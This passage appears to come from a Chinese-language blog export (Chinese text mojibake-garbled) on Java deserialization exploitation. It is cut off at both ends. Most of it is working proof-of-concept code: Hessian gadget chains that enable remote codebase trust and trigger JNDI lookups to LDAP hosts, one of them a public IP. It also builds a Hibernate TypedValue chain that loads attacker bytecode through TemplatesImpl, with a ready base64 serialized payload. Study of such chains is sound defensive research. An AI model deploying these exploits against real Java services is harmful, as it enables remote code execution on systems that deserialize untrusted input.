createObjWithoutConstructor(MimeTypeParameterList.class); UIDefaults defaults0 = new UIDefaults(); SwingLazyValue swingLazyValue0 = new SwingLazyValue(sun.reflect.misc.MethodUtil,invoke,new Object[]invokeMethod,new Object(),new Object[]setPropertyMethod,new Object(),new Object[]com.sun.jndi.ldap.object.trustURLCodebase,true);// System.setProperty(com.sun.jndi.ldap.object.trustURLCodebase,true); Field field = BaseRowSet.class.getDeclaredField(dataSource); field.setAccessible(true); JdbcRowSetImpl jdbcRowSet = createObjWithoutConstructor(JdbcRowSetImpl.class); field.set(jdbcRowSet,ldap://127.0.0.1:8085/evil);// jdbcRowSet.getDatabaseMetaData(); MimeTypeParameterList mimeTypeParameterList = createObjWithoutConstructor(MimeTypeParameterList.class); UIDefaults defaults = new UIDefaults(); SwingLazyValue swingLazyValue = new SwingLazyValue(sun.reflect.misc.MethodUtil,invoke,new Object[]invokeMethod,new Object(),new Object[]jndiMethod,jdbcRowSet,new Object[]); defaults0.put(777,swingLazyValue0); defaults.put(1,swingLazyValue); setField(mimeTypeParameterList0,parameters,defaults0); setField(mimeTypeParameterList,parameters,defaults);// System.out.println(mimeTypeParameterList); try String s0 = ser(mimeTypeParameterList0); System.out.println(s0); unser(s0); finally String s = ser(mimeTypeParameterList); System.out.println(s); unser(s); PKCS9AttributesPKCS9Attributes#toString- PKCS9Attributes#getAttribute- UIDefaults#get- UIDefaults#getFromHashTable- UIDefaults$LazyValue#createValue- SwingLazyValue#createValue- InitialContext#doLookup() InitialContext.doLookup()é™¤äº†ä¸Šé¢çš„MethodUtilsä¹‹å¤–ï¼ŒInitialContext.doLookup()ä¹Ÿæ˜¯å¯åˆ©ç”¨çš„é™æ€æ–¹æ³•ï¼Œèƒ½ç›´æ¥è¿›è¡Œjndiæ³¨å…¥ Poc package org.example;import com.caucho.hessian.io.Hessian2Input;import com.caucho.hessian.io.Hessian2Output;import sun.reflect.ReflectionFactory;import sun.reflect.misc.MethodUtil;import sun.swing.SwingLazyValue;import javax.activation.MimeTypeParameterList;import javax.swing.*;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.*;public class Test public static void main(String[] args) throws Exception MimeTypeParameterList mimeTypeParameterList = createObjWithoutConstructor(MimeTypeParameterList.class); UIDefaults defaults = new UIDefaults(); SwingLazyValue swingLazyValue = new SwingLazyValue(javax.naming.InitialContext,doLookup,new Object[]ldap://192.168.43.143:50389/56a5ff); defaults.put(666,swingLazyValue); setField(mimeTypeParameterList,parameters,defaults); String s = ser(mimeTypeParameterList); System.out.println(s); unser(s); public static Object unser(String string) throws Exception ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(string)); Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream); Object obj = hessian2Input.readObject(); return obj; public static String ser(Object object) throws Exception ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream); hessian2Output.getSerializerFactory().setAllowNonSerializable(true); byteArrayOutputStream.write(67); hessian2Output.writeObject(object); hessian2Output.flushBuffer(); return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()); public static void setField(Object object,String fieldName,Object value) throws Exception Class? c = object.getClass(); Field field = c.getDeclaredField(fieldName); field.setAccessible(true); field.set(object,value); public static T T createObjWithoutConstructor(ClassT clazz) throws Exception ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory(); ConstructorObject constructor = Object.class.getDeclaredConstructor(); Constructor? constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor); constructor1.setAccessible(true); return (T) constructor1.newInstance(); åœ¨jdké«˜ç‰ˆæœ¬æƒ…å†µä¸‹å°†å¯¹åº”ç‰ˆæœ¬çš„trustURLCodebaseè®¾ç½®ä¸ºtrueï¼Œç»•è¿‡JNDIé™åˆ¶ å†è°ƒç”¨InitialContext#doLookupå®ç°JNDIæ³¨å…¥ package com.Hessian; import com.caucho.hessian.io.Hessian2Input;import com.caucho.hessian.io.Hessian2Output;import sun.swing.SwingLazyValue;import javax.activation.MimeTypeParameterList;import javax.swing.*;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.lang.reflect.Field;import java.lang.reflect.Method; public class EXP4 public static void main(String[] args) throws Exception UIDefaults uiDefaults1 = new UIDefaults(); UIDefaults uiDefaults2 = new UIDefaults(); Method setProperty = Class.forName(java.lang.System).getDeclaredMethod(setProperty, String.class, String.class); Method invokeMethod = Class.forName(sun.reflect.misc.MethodUtil).getDeclaredMethod(invoke, Method.class, Object.class, Object[].class); SwingLazyValue slz1 = new SwingLazyValue(sun.reflect.misc.MethodUtil, invoke, new Object[]invokeMethod, new Object(), new Object[]setProperty, new Object(), new Object[]com.sun.jndi.ldap.object.trustURLCodebase, true); Method doLookup = Class.forName(javax.naming.InitialContext).getDeclaredMethod(doLookup, String.class); SwingLazyValue slz2 = new SwingLazyValue(sun.reflect.misc.MethodUtil, invoke, new Object[]invokeMethod, new Object(), new Object[]doLookup, new Object(), new Object[]ldap://124.222.136.33:1337/#suibian); uiDefaults1.put(xxx, slz1); MimeTypeParameterList mimeTypeParameterList1 = new MimeTypeParameterList(); setFieldValue(mimeTypeParameterList1, parameters, uiDefaults1); uiDefaults2.put(xxx, slz2); MimeTypeParameterList mimeTypeParameterList2 = new MimeTypeParameterList(); setFieldValue(mimeTypeParameterList2, parameters, uiDefaults2); try ser(mimeTypeParameterList1); catch (Exception e) ser(mimeTypeParameterList2); public static void ser(Object evil) throws Exception ByteArrayOutputStream baos = new ByteArrayOutputStream(); Hessian2Output output = new Hessian2Output(baos); output.getSerializerFactory().setAllowNonSerializable(true); //å…è®¸ååºåˆ—åŒ–NonSerializable baos.write(67); output.writeObject(evil); output.flushBuffer(); ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); Hessian2Input input = new Hessian2Input(bais); input.readObject(); public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value);","categories":["javaååºåˆ—åŒ–"]},{"title":"javaååºåˆ—åŒ–ä¹‹Hibernate","path":"/2025/03/10/javaååºåˆ—åŒ–ä¹‹Hibernate/","content":"hibernate1hibernate5å¯¼å…¥ä¾èµ–dependency groupIdorg.hibernate/groupId artifactIdhibernate-core/artifactId version5.6.15.Final/version/dependency åˆ†æå…ˆçœ‹ä¸€æ‰‹ysoä¸­çš„gadget /** * org.hibernate.property.access.spi.GetterMethodImpl.get() * org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue() * org.hibernate.type.ComponentType.getPropertyValue(C) * org.hibernate.type.ComponentType.getHashCode() * org.hibernate.engine.spi.TypedValue$1.initialize() * org.hibernate.engine.spi.TypedValue$1.initialize() * org.hibernate.internal.util.ValueHolder.getValue() * org.hibernate.engine.spi.TypedValue.hashCode() */ å¯ä»¥çœ‹åˆ°æ¼æ´ç‚¹æ˜¯GetterMethodImplç±»ä¸­çš„get()æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¸­ç›´æ¥è¿›è¡Œäº†ä¸€ä¸ªinvokeçš„è°ƒç”¨ å…¶ä¸­çš„getterMethodå¯ä»¥é€šè¿‡åå°„èµ‹å€¼ æˆ‘ä»¬è·Ÿç€gadgetå¾€ä¸Šè·Ÿåˆ°AbstractComponentTuplizer.getPropertyValue()ï¼ŒåŒæ ·çš„ï¼Œgetteræ•°ç»„è¿˜æ˜¯èƒ½å¤Ÿè¢«åå°„èµ‹å€¼ ç»§ç»­å¾€ä¸Šè·Ÿï¼ŒcomponentTuplizerå¯æ§ï¼Œè‹¥componentTuplizerä¸ºæˆ‘ä»¬ä¸Šé¢è¯´åˆ°çš„AbstractComponentTuplizerç±»çš„å¯¹è±¡çš„è¯ï¼Œå³å¯è§¦å‘åˆ©ç”¨é“¾ å¾€ä¸Šèµ°çš„è¯è¿˜æ˜¯æœ¬ç±»ä¸­çš„getHashCode()æ–¹æ³•è°ƒç”¨äº†getPropertyValueæ–¹æ³• æŸ¥æ‰¾getHashCode()æ–¹æ³•çš„ç”¨æ³•ï¼Œå‘ç°æ˜¯åœ¨TypedValueç±»çš„initTransients()ä¸‹çš„initialize()ä¸­ä¸€ä¸ªåŒ¿åç±»é‡Œé¢çš„è°ƒç”¨ initTransients()æ–¹æ³•åœ¨è¯¥ç±»çš„æ„é€ å‡½æ•°ä¸­è¿›è¡Œäº†è°ƒç”¨ï¼Œæ‰€ä»¥åœ¨åç»­è¿›è¡Œååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è°ƒç”¨TypedValueçš„æ„é€ æ–¹æ³•æ—¶å€™ä¾¿ä¼šç”Ÿæˆä¸€ä¸ªDeferredInitializeråŒ¿åç±»å®ä¾‹ è·Ÿç€gadgetç»§ç»­å¾€ä¸Šèµ°ï¼ŒValueHolderçš„getValue()æ–¹æ³•ä¼šè°ƒç”¨ä¸Šé¢æåˆ°çš„åŒ¿åç±»ä¸­çš„initialize()æ–¹æ³• æŸ¥æ‰¾getValue()æ–¹æ³•çš„ç”¨æ³•ï¼Œè·‘å›åˆ°äº†TypedValueç±»é‡Œé¢ï¼Œæ˜¯è¯¥ç±»ä¸­çš„hashCode()æ–¹æ³• è¿™é‡Œæˆ‘ä»¬ç”¨HashMapç±»ä½œä¸ºå…¥å£ç±»ï¼Œåœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨TypedValueçš„hashCode()æ–¹æ³•ï¼Œæ€ä¹ˆè°ƒç”¨çš„å‘¢ åœ¨å®ƒçš„readObjectæ–¹æ³•ä¸­ä¼šè°ƒç”¨putValæ–¹æ³•ï¼Œå…¶ä¸­ä¼šå†è°ƒç”¨hash()æ–¹æ³• æ„é€ pocæ‰¿æ¥ä¸Šé¢çš„åˆ†æï¼Œåœ¨è°ƒç”¨TypedValueçš„hashCode()æ–¹æ³•åï¼Œå¾€ä¸‹èµ°ä¼šè°ƒç”¨è¯¥ç±»ä¸­typeå±æ€§çš„getHashCodeæ–¹æ³• æ ¹æ®ä¸Šé¢çš„åˆ†ææˆ‘ä»¬å¯ä»¥çŸ¥é“typeå¿…é¡»æ˜¯ComponetTypeç±»å¯¹è±¡ å…¶æ„é€ å‡½æ•°å‚æ•°éƒ½æ˜¯hibernateè‡ªå·±å°è£…çš„ä¸€äº›ç±»ï¼Œä¹Ÿéƒ½ä¸æ˜¯JavaBeanï¼Œç»™åˆ›å»ºComponentTypeå¯¹è±¡å¸¦æ¥äº†ä¸å°çš„éº»çƒ¦ äºæ˜¯ä¹è¿™é‡Œå¼•å…¥äº†ReflectionFactoryï¼Œèƒ½å¤Ÿç»•è¿‡æ„é€ å‡½æ•°åˆ›å»ºä¸€ä¸ªå¯¹è±¡ https://www.cnblogs.com/strongmore/p/15470175.html è¿™é‡Œå†™ä¸ªæ–¹æ³•æ–¹ä¾¿ä¹‹åè¿›è¡Œè°ƒç”¨ public static Object createObjWithoutConstructor(Class clazz) throws Exception ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory(); ConstructorObject constructor = Object.class.getDeclaredConstructor(); Constructor? constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor); constructor1.setAccessible(true); return constructor1.newInstance(); æ‰€ä»¥åœ¨ç”ŸæˆTypedValueå¯¹è±¡æ—¶ä¾¿å¦‚ä¸‹æ‰€ç¤º TypedValue typedValue = new TypedValue(componentType,11); é€šè¿‡ä¸Šé¢çš„createObjWithoutConstructorå‡½æ•°æˆ‘ä»¬ç”Ÿæˆçš„æ˜¯ä¸€ä¸ªå¹²å¹²å‡€å‡€çš„ComponentTypeå¯¹è±¡ï¼Œå®ƒçš„å„ç§å±æ€§æˆ‘ä»¬éƒ½æ²¡æœ‰è¿›è¡Œèµ‹å€¼ æ‰€ä»¥æˆ‘ä»¬è¦å¯¹ä¸€äº›å¿…è¦çš„å±æ€§è¿›è¡Œåå°„èµ‹å€¼ é€šè¿‡å¯¹getHashCodeæ–¹æ³•çš„è§‚å¯Ÿï¼Œæˆ‘ä»¬çŸ¥é“ç»§ç»­è°ƒç”¨getPropertyValueæ–¹æ³•çš„æ—¶å€™æˆ‘ä»¬çš„xå’Œiåç»­ä¼šä¼ å…¥componentTuplizer.getPropertyValue(component, i)ä¸­ æˆ‘ä»¬è¦èµ°è¿›å…¶forå¾ªç¯ä¸­ï¼Œæ‰€ä»¥å…ˆç»™propertySpanèµ‹å€¼2ï¼Œèµ°è¿›getPropertyValue( x, i ); æ¥åˆ°412è¡Œçš„componentTuplizer.getPropertyValue( component, i )ï¼Œè¿™ä¸ªcomponentTuplizeréœ€è¦æ˜¯ä¸€ä¸ªAbstractComponentTuplizerå¯¹è±¡ ä½†AbstractComponentTuplizerç±»æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»æ‰¾åˆ°å®ƒçš„å®ç°ç±» è¿™é‡Œç”¨çš„æ˜¯PojoComponentTuplizerç±»ï¼Œåå°„èµ‹å€¼ PojoComponentTuplizer pojoComponentTuplizer = (PojoComponentTuplizer) createObjWithoutConstructor(PojoComponentTuplizer.class);setField(componentType,componentTuplizer,pojoComponentTuplizer); è¿™æ ·å­çš„è¯å°±ä¼šèµ°åˆ°AbstractComponentTuplizerç±»ä¸­çš„getPropertyValue()æ–¹æ³•ä¸­ åœ¨è¿™ä¸ªæ–¹æ³•é‡Œé¢åªè¦getters[i]æ˜¯GetterMethodImplå¯¹è±¡ï¼Œcomponentæ˜¯è°ƒç”¨æ¶æ„getterçš„å¯¹è±¡å°±è¡Œäº† è¯´åˆ°è°ƒç”¨æ¶æ„getterçš„å¯¹è±¡ï¼Œå¾ˆå®¹æ˜“å°±è”æƒ³åˆ°äº†å‰é¢å­¦çš„CBé“¾å’Œjacksonä¸­ç›¸å…³çš„pocéƒ½æœ‰åˆ©ç”¨åˆ°TemplateImplç±»çš„getOutputProperties()æ–¹æ³•ï¼ŒgetOutputProperties()æ–¹æ³•åˆè¿›ä¸€æ­¥è°ƒç”¨TemplateImpl.newTransformer()æ–¹æ³•ï¼Œä»è€Œå®ç°æ¶æ„ç±»åŠ è½½ è¿™é‡Œæˆ‘ä»¬éœ€è¦å¯¹gettersæ•°ç»„è¿›è¡Œèµ‹å€¼ï¼Œä½†AbstractComponentTuplizeræ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»è·å–å®ƒçš„classæµ‹iå¯ä»¥è¿›è¡Œèµ‹å€¼ Class? c = AbstractComponentTuplizer.class;Field field = c.getDeclaredField(getters);field.setAccessible(true);field.set(pojoComponentTuplizer,new Getter[]new GetterMethodImpl(Object.class,qwq, TemplatesImpl.class.getDeclaredMethod(getOutputProperties))); èµ°åˆ°GetterMethodImplç±»ä¸­çš„getæ–¹æ³•åï¼Œæˆ‘ä»¬åªè¦è®©è¯¥æ–¹æ³•çš„ownerå‚æ•°ä¸ºä¹‹å‰åˆ©ç”¨çš„templateå¯¹è±¡å³å¯ å°è£…ä¸€æ‰‹ public static TemplatesImpl getTemplateImpl() throws Exception ClassLoader classLoader = ClassLoader.getSystemClassLoader(); byte[] bytes = Files.readAllBytes(Paths.get(D:\\\\tmp\\\\Test1.class)); Class? c = Class.forName(java.lang.ClassLoader); Method m = c.getDeclaredMethod(defineClass, byte[].class, int.class, int.class); m.setAccessible(true); Class? c1 = (Class?) m.invoke(classLoader,bytes,0,bytes.length); TemplatesImpl templates = new TemplatesImpl(); Class? templatesClass = templates.getClass(); Field _classField = templatesClass.getDeclaredField(_class); _classField.setAccessible(true); _classField.set(templates,new Class[]c1); Field _nameField = templatesClass.getDeclaredField(_name); _nameField.setAccessible(true); _nameField.set(templates,666); Field _transletIndexField = templatesClass.getDeclaredField(_transletIndex); _transletIndexField.setAccessible(true); _transletIndexField.set(templates,0); Field _tfactoryField = templatesClass.getDeclaredField(_tfactory); _tfactoryField.setAccessible(true); _tfactoryField.set(templates,new TransformerFactoryImpl()); return templates; ç„¶ååœ¨TypedValueæ„é€ å‡½æ•°å¤„èµ‹å€¼ä¸€ä¸‹ TypedValue typedValue = new TypedValue(componentType,getTemplateImpl()); æœ€åˆç‰ˆæœ¬çš„pocå¦‚ä¸‹ package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.hibernate.engine.spi.TypedValue;import org.hibernate.property.access.spi.Getter;import org.hibernate.property.access.spi.GetterMethodImpl;import org.hibernate.tuple.component.AbstractComponentTuplizer;import org.hibernate.tuple.component.PojoComponentTuplizer;import org.hibernate.type.ComponentType;import sun.reflect.ReflectionFactory;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;public class Main public static void main(String[] args) throws Exception HashMapObject,Object hashMap = new HashMap(); ComponentType componentType = (ComponentType) createObjWithoutConstructor(ComponentType.class); setField(componentType,propertySpan,2); TypedValue typedValue = new TypedValue(componentType,getTemplateImpl()); PojoComponentTuplizer pojoComponentTuplizer = (PojoComponentTuplizer) createObjWithoutConstructor(PojoComponentTuplizer.class); Class? c = AbstractComponentTuplizer.class; Field field = c.getDeclaredField(getters); field.setAccessible(true); field.set(pojoComponentTuplizer,new Getter[]new GetterMethodImpl(Object.class,qwq, TemplatesImpl.class.getDeclaredMethod(getOutputProperties))); setField(componentType,componentTuplizer,pojoComponentTuplizer); hashMap.put(typedValue,1); byte[] bytes = ser(hashMap); System.out.println(Base64.getEncoder().encodeToString(bytes)); unser(bytes); public static Object createObjWithoutConstructor(Class clazz) throws Exception ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory(); ConstructorObject constructor = Object.class.getDeclaredConstructor(); Constructor? constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor); constructor1.setAccessible(true); return constructor1.newInstance(); public static void setField(Object object,String fieldName,Object value) throws Exception Class? c = object.getClass(); Field field = c.getDeclaredField(fieldName); field.setAccessible(true); field.set(object,value); public static TemplatesImpl getTemplateImpl() throws Exception ClassLoader classLoader = ClassLoader.getSystemClassLoader(); byte[] bytes = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\Test.class)); Class? c = Class.forName(java.lang.ClassLoader); Method m = c.getDeclaredMethod(defineClass, byte[].class, int.class, int.class); m.setAccessible(true); Class? c1 = (Class?) m.invoke(classLoader,bytes,0,bytes.length); TemplatesImpl templates = new TemplatesImpl(); Class? templatesClass = templates.getClass(); Field _classField = templatesClass.getDeclaredField(_class); _classField.setAccessible(true); _classField.set(templates,new Class[]c1); Field _nameField = templatesClass.getDeclaredField(_name); _nameField.setAccessible(true); _nameField.set(templates,666); Field _transletIndexField = templatesClass.getDeclaredField(_transletIndex); _transletIndexField.setAccessible(true); _transletIndexField.set(templates,0); Field _tfactoryField = templatesClass.getDeclaredField(_tfactory); _tfactoryField.setAccessible(true); _tfactoryField.set(templates,new TransformerFactoryImpl()); return templates; public static byte[] ser(Object o) throws Exception ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(o); return byteArrayOutputStream.toByteArray(); public static Object unser(byte[] bytes) throws Exception ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); return objectInputStream.readObject(); è¿è¡Œåç¡®å®å¼¹å‡ºäº†è®¡ç®—å™¨ï¼Œä½†æ˜¯å´æŠ¥é”™äº†ï¼Œæ˜¯åœ¨putçš„æ—¶å€™è§¦å‘gadgetçš„ç»å…¸é—®é¢˜ï¼Œä½†æ˜¯ç”±äºè¿™ä¸ªåˆ©ç”¨é“¾ä¸­å¾ˆå¤šå¯¹è±¡çš„èµ‹å€¼éƒ½ä¸ç¬¦åˆè§„èŒƒç”šè‡³æœªèµ‹å€¼ï¼ŒæŠ›npeä¹Ÿæ˜¯æ­£å¸¸çš„ ä½†æ˜¯è¿™æ ·ä¸€æ¥æˆ‘ä»¬å°±æ²¡åŠæ³•è¾“å‡ºä¸€ä¸ªåºåˆ—åŒ–ä¹‹åçš„hashMapäº†ï¼Œé‚£å°±å¾—æƒ³åŠæ³•ä¸è®©ä»–åœ¨putçš„æ—¶å€™å°†é“¾å­èµ°ä¸‹å» å¯¹hashMapè¿›è¡Œä¸€æ³¢å°æ”¹ hashMap.put(1,1);Field tableField = HashMap.class.getDeclaredField(table);tableField.setAccessible(true);Object[] table = (Object[]) tableField.get(hashMap);for (Object entry: table) if (entry != null) setField(entry,key,typedValue); è¿™æ—¶å€™å°±å¯ä»¥è§¦å‘ååºåˆ—åŒ–ï¼Œå¹¶ä¸”è¾“å‡ºpayloadäº† æŠŠè¿™ä¸€æ®µbase64æ‹¿å»æµ‹è¯•ï¼ŒæˆåŠŸå¼¹çª— byte[] bytes1 = Base64.getDecoder().decode(rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGXHO08ZYmxfcgIADVoAHGNyZWF0ZUVtcHR5Q29tcG9zaXRlc0VuYWJsZWRaABJoYXNOb3ROdWxsUHJvcGVydHlaAAVpc0tleUkADHByb3BlcnR5U3BhbkwAD2NhbkRvRXh0cmFjdGlvbnQAE0xqYXZhL2xhbmcvQm9vbGVhbjtbAAdjYXNjYWRldAAoW0xvcmcvaGliZXJuYXRlL2VuZ2luZS9zcGkvQ2FzY2FkZVN0eWxlO0wAEWNvbXBvbmVudFR1cGxpemVydAAxTG9yZy9oaWJlcm5hdGUvdHVwbGUvY29tcG9uZW50L0NvbXBvbmVudFR1cGxpemVyO0wACmVudGl0eU1vZGV0ABpMb3JnL2hpYmVybmF0ZS9FbnRpdHlNb2RlO1sAC2pvaW5lZEZldGNodAAaW0xvcmcvaGliZXJuYXRlL0ZldGNoTW9kZTtbAA1wcm9wZXJ0eU5hbWVzdAATW0xqYXZhL2xhbmcvU3RyaW5nO1sAE3Byb3BlcnR5TnVsbGFiaWxpdHl0AAJbWlsADXByb3BlcnR5VHlwZXN0ABpbTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO1sAIXByb3BlcnR5VmFsdWVHZW5lcmF0aW9uU3RyYXRlZ2llc3QAJltMb3JnL2hpYmVybmF0ZS90dXBsZS9WYWx1ZUdlbmVyYXRpb247eHIAH29yZy5oaWJlcm5hdGUudHlwZS5BYnN0cmFjdFR5cGXJFpSxstQ41AIAAHhwAAAAAAAAAnBwc3IAM29yZy5oaWJlcm5hdGUudHVwbGUuY29tcG9uZW50LlBvam9Db21wb25lbnRUdXBsaXplcsBwOcjTg59YAgAETAAOY29tcG9uZW50Q2xhc3N0ABFMamF2YS9sYW5nL0NsYXNzO0wACW9wdGltaXplcnQAMExvcmcvaGliZXJuYXRlL2J5dGVjb2RlL3NwaS9SZWZsZWN0aW9uT3B0aW1pemVyO0wADHBhcmVudEdldHRlcnQAKkxvcmcvaGliZXJuYXRlL3Byb3BlcnR5L2FjY2Vzcy9zcGkvR2V0dGVyO0wADHBhcmVudFNldHRlcnQAKkxvcmcvaGliZXJuYXRlL3Byb3BlcnR5L2FjY2Vzcy9zcGkvU2V0dGVyO3hyADdvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5BYnN0cmFjdENvbXBvbmVudFR1cGxpemVy8vZxKVYnaN0CAAVaABJoYXNDdXN0b21BY2Nlc3NvcnNJAAxwcm9wZXJ0eVNwYW5bAAdnZXR0ZXJzdAArW0xvcmcvaGliZXJuYXRlL3Byb3BlcnR5L2FjY2Vzcy9zcGkvR2V0dGVyO0wADGluc3RhbnRpYXRvcnQAIkxvcmcvaGliZXJuYXRlL3R1cGxlL0luc3RhbnRpYXRvcjtbAAdzZXR0ZXJzdAArW0xvcmcvaGliZXJuYXRlL3Byb3BlcnR5L2FjY2Vzcy9zcGkvU2V0dGVyO3hwAAAAAAB1cgArW0xvcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyOyaF+ANJPbfPAgAAeHAAAAABc3IAPW9yZy5oaWJlcm5hdGUucHJvcGVydHkuYWNjZXNzLnNwaS5HZXR0ZXJNZXRob2RJbXBsJFNlcmlhbEZvcm2sW7ZWyd0bWAIABEwADmNvbnRhaW5lckNsYXNzcQB+ABNMAA5kZWNsYXJpbmdDbGFzc3EAfgATTAAKbWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wADHByb3BlcnR5TmFtZXEAfgAfeHB2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHB2cgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AB9MABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cHQAE2dldE91dHB1dFByb3BlcnRpZXN0AANxd3FwcHBwcHBwcHBwcHBzcQB+ACMAAAAAAAAAAHB1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAF2cgAQb3JnLmV4YW1wbGUuVGVzdAAAAAAAAAAAAAAAeHB0AAM2NjZwdwEAeHNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABeA==);unser(bytes1); æœ€ç»ˆpocï¼š package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.hibernate.engine.spi.TypedValue;import org.hibernate.property.access.spi.Getter;import org.hibernate.property.access.spi.GetterMethodImpl;import org.hibernate.tuple.component.AbstractComponentTuplizer;import org.hibernate.tuple.component.PojoComponentTuplizer;import org.hibernate.type.ComponentType;import sun.reflect.ReflectionFactory;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;public class Main public static void main(String[] args) throws Exception HashMapObject,Object hashMap = new HashMap(); ComponentType componentType = (ComponentType) createObjWithoutConstructor(ComponentType.class); setField(componentType,propertySpan,2); TypedValue typedValue = new TypedValue(componentType,getTemplateImpl()); PojoComponentTuplizer pojoComponentTuplizer = (PojoComponentTuplizer) createObjWithoutConstructor(PojoComponentTuplizer.class); Class? c = AbstractComponentTuplizer.class; Field field = c.getDeclaredField(getters); field.setAccessible(true); field.set(pojoComponentTuplizer,new Getter[]new GetterMethodImpl(Object.class,qwq, TemplatesImpl.class.getDeclaredMethod(getOutputProperties))); setField(componentType,componentTuplizer,pojoComponentTuplizer); hashMap.put(1,1); Field tableField = HashMap.class.getDeclaredField(table); tableField.setAccessible(true); Object[] table = (Object[]) tableField.get(hashMap); for (Object entry: table) if (entry != null) setField(entry,key,typedValue); byte[] bytes = ser(hashMap); System.out.println(Base64.getEncoder().encodeToString(bytes)); unser(bytes); public static Object createObjWithoutConstructor(Class clazz) throws Exception ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory(); ConstructorObject constructor = Object.class.getDeclaredConstructor(); Constructor? constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor); constructor1.setAccessible(true); return constructor1.newInstance(); public static void setField(Object object,String fieldName,Object value) throws Exception Class? c = object.getClass(); Field field = c.getDeclaredField(fieldName); field.setAccessible(true); field.set(object,value); public static TemplatesImpl getTemplateImpl() throws Exception ClassLoader classLoader = ClassLoader.getSystemClassLoader(); byte[] bytes = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\Test.class)); Class? c = Class.forName(java.lang.ClassLoader); Method m = c.getDeclaredMethod(defineClass, byte[].class, int.class, int.class); m.setAccessible(true); Class? c1 = (Class?) m.invoke(classLoader,bytes,0,bytes.length); TemplatesImpl templates = new TemplatesImpl(); Class? templatesClass = templates.getClass(); Field _classField = templatesClass.getDeclaredField(_class); _classField.setAccessible(true); _classField.set(templates,new Class[]c1); Field _nameField = templatesClass.getDeclaredField(_name); _nameField.setAccessible(true); _nameField.set(templates,666); Field _transletIndexField = templatesClass.getDeclaredField(_transletIndex); _transletIndexField.setAccessible(true); _transletIndexField.set(templates,0); Field _tfactoryField = templatesClass.getDeclaredField(_tfactory); _tfactoryField.setAccessible(true); _tfactoryField.set(templates,new TransformerFactoryImpl()); return templates; public static byte[] ser(Object o) throws 